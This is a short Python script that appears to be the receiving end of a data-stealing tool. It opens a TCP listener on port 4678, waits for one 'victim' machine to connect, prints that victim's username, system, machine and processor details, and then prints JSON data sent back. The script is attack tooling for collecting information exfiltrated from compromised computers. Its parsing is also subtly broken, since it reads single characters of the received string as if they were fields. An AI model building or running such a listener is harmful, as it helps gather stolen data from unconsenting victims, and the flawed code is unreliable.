import socket
import json

# Linux IP: 192.168.1.157
SERVER_IP = input("Enter the IP address: ")
PORT = 4678

try:
    # Create the socket using "with" to automatically close the socket
    with (socket.socket(socket.AF_INET, socket.SOCK_STREAM)) as sock:
        print("Listening for incoming connections...")

        #  Bind the IP address to the port
        sock.bind((SERVER_IP, PORT))
        
        # Only listen for 1 connect request. When a request is received, 
        # reject any further requests to connect
        sock.listen(1)
        
        # When a connection is accepted, an instance representing
        # the client and server's connection and the address of the client
        # Use this connection instance to communciate with the connected client
        connection, address = sock.accept()
        received_victim_details = False
        count = 0

        with (connection):
            print(f"Connection was established with: {address}")

            while True:
                # Data can only be sent as binary. Prefix it with 'b'
                # connection.send(b"Hehehe...")
                data = connection.recv(1024).decode("ascii")

                if not data:
                    break
                
                # Display details of the victim first
                if count == 0:
                    print("[VICTIM DETAILS]\n")
                    print(f"Username: {data[0]}")
                    print(f"System: {data[4]}")
                    print(f"Machine: {data[1]}")
                    print(f"Processor: {data[2]}")
                    print(f"Processor count: {data[3]}")
                
                else:
                    print(f"Received: {json.loads(data)}")
                    
                count += 1

except OSError as e:
    print(f"Failed to assign IP address: {e.strerror}")